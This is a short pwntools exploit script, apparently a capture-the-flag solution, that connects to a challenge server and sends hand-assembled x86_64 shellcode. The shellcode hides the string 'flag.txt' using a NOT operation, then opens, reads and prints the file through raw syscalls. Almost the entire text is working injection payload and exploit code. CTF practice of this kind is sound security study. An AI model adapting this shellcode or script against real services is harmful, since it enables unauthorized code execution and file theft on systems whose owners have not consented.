from pwn import *

p = remote('chal.sieberr.live', 21002)

# Shellcode ORW x86_64 menggunakan sys_open (Syscall 2)
shellcode = b""

# 1. Push NULL terminator (8-byte nol) ke stack
shellcode += b"\x48\x31\xc0"                             # xor rax, rax
shellcode += b"\x50"                                     # push rax

# 2. Push string "flag.txt" ke stack via operasi NOT
shellcode += b"\x48\xb8\x99\x93\x9e\x98\xd1\x8b\x87\x8b" # mov rax, 0x8b878bd1989e9399
shellcode += b"\x48\xf7\xd0"                             # not rax
shellcode += b"\x50"                                     # push rax

# 3. Syscall Open (sys_open = 2)
shellcode += b"\x48\x89\xe7"                             # mov rdi, rsp (pointer ke "flag.txt")
shellcode += b"\x48\x31\xf6"                             # xor rsi, rsi (O_RDONLY = 0)
shellcode += b"\x48\x31\xc0"                             # xor rax, rax
shellcode += b"\xb0\x02"                                 # mov al, 2
shellcode += b"\x0f\x05"                                 # syscall

# 4. Syscall Read (sys_read = 0)
shellcode += b"\x48\x89\xc7"                             # mov rdi, rax (fd file descriptor)
shellcode += b"\x48\x89\xe6"                             # mov rsi, rsp (buffer penyimpanan di stack)
shellcode += b"\x48\x31\xd2"                             # xor rdx, rdx
shellcode += b"\xb2\x40"                                 # mov dl, 64 (baca 64 byte)
shellcode += b"\x48\x31\xc0"                             # xor rax, rax
shellcode += b"\x0f\x05"                                 # syscall

# 5. Syscall Write (sys_write = 1)
shellcode += b"\x48\x31\xff"                             # xor rdi, rdi
shellcode += b"\x40\xb7\x01"                             # mov dil, 1 (stdout)
shellcode += b"\x48\x89\xe6"                             # mov rsi, rsp (pointer ke isi flag)
shellcode += b"\x48\x31\xd2"                             # xor rdx, rdx
shellcode += b"\xb2\x40"                                 # mov dl, 64
shellcode += b"\x48\x31\xc0"                             # xor rax, rax
shellcode += b"\xb0\x01"                                 # mov al, 1
shellcode += b"\x0f\x05"                                 # syscall

log.info(f"Ukuran shellcode sys_open: {len(shellcode)} bytes")

p.sendlineafter(b"who even gives a sh?", shellcode)
p.interactive()
